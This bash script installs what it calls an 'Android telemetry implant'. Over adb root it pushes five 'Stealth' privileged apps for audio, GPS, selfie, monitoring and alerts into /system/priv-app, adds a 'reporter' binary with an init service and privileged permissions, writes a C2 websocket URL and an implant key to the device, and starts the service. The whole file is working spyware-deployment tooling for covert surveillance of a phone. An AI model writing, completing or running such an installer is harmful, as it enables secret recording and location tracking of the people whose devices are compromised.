#!/bin/bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

echo "Installing and enabling the Android telemetry implant..."
adb root
adb remount
adb shell mkdir -p /system/etc/init /system/etc/permissions /system/priv-app

declare -A PACKAGE_NAMES=(
  [StealthAudio]=com.stealthaudio
  [StealthAlert]=com.stealthalert
  [StealthGps]=com.stealthgps
  [StealthMonitor]=com.stealthmonitor
  [StealthSelfie]=com.stealthselfie
)

# FIX S-1: push ONLY to /system/priv-app/{package_name}/ (never system_ext).
# Pushing to both locations causes PackageManager to refuse to scan either copy.
for app in StealthAudio StealthAlert StealthGps StealthMonitor StealthSelfie; do
  pkg="${PACKAGE_NAMES[$app]}"
  # Clean up any old label-named or duplicate folders first
  adb shell "rm -rf /system_ext/priv-app/$app 2>/dev/null || true"
  adb shell "rm -rf /system_ext/priv-app/$pkg 2>/dev/null || true"
  adb shell "rm -rf /system/priv-app/$app 2>/dev/null || true"
  adb shell "mkdir -p /system/priv-app/$pkg"
  adb push "$ROOT/system/priv-app/$app/$app.apk" "/system/priv-app/$pkg/$pkg.apk"
  adb shell "chmod 755 /system/priv-app/$pkg"
  adb shell "chmod 644 /system/priv-app/$pkg/$pkg.apk"
  adb shell "rm -f /system/priv-app/$pkg/*.idsig 2>/dev/null || true"
  adb shell "restorecon -Rv /system/priv-app/$pkg 2>/dev/null || true"
done

adb push "$ROOT/system/bin/reporter" /system/bin/reporter
adb push "$ROOT/system/etc/init/reporter.rc" /system/etc/init/reporter.rc
adb push "$ROOT/privapp-permissions-stealth.xml" /system/etc/permissions/privapp-permissions-stealth.xml
adb shell chmod 755 /system/bin/reporter
adb shell chmod 644 /system/etc/init/reporter.rc
adb shell chmod 644 /system/etc/permissions/privapp-permissions-stealth.xml
adb shell "restorecon -v /system/bin/reporter /system/etc/init/reporter.rc 2>/dev/null || true"
adb shell "restorecon -v /system/etc/permissions/privapp-permissions-stealth.xml 2>/dev/null || true"

adb shell 'mkdir -p /data/local/tmp /data/system
  printf "%s\n" "ws://127.0.0.1:8000/ws" > /data/local/tmp/c2_url.txt
  printf "%s\n" "DeltaForce2027" > /data/local/tmp/implant.key
  printf "%s\n" "60" > /data/system/ping_interval.txt
  touch /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt
  rm -f /data/local/tmp/reporter_disable
  chmod 666 /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable 2>/dev/null || true
  chmod 644 /data/system/ping_interval.txt 2>/dev/null || true
  chown system:system /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable 2>/dev/null || true
  chown root:root /data/system/ping_interval.txt 2>/dev/null || true
  chcon u:object_r:system_data_file:s0 /data/local/tmp/c2_url.txt /data/local/tmp/implant.key /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled /data/local/tmp/screen_time_minutes.txt /data/local/tmp/reporter_disable /data/system/ping_interval.txt 2>/dev/null || true'

adb shell "start system_telemetry_service"
echo "Implant and Stealth priv-apps have been installed. Reboot the device for the new init service and apps to be loaded."
